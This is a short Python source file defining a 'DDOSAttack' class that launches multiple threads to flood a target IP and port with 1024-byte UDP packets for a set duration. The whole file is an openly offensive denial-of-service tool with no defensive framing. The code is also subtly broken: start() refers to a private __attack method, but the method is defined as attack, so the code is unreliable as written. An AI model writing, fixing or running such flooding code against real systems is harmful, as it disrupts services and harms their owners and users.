import socket
import threading
import time 
class DDOSAttack:
    __target_ip : str 
    __target_port: str 
    __num_threads : int 
    __duration : float 
    __running : bool
    

    def __init__(self, target_ip, target_port, num_threads, duration):
        self.__target_ip = target_ip
        self.__target_port = target_port
        self.__num_threads = num_threads
        self.__duration = duration
        self.__running = False

    def start(self):
        self.__running = True
        threads = []
        for i in range(self.__num_threads):
            thread = threading.Thread(target=self.__attack)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    def stop(self):
        self.__running = False

    def attack(self):
        end_time = time.time() + self.__duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while self.__running and time.time() < end_time:
            data = b'0' * 1024  
            sock.sendto(data, (self.__target_ip, self.__target_port))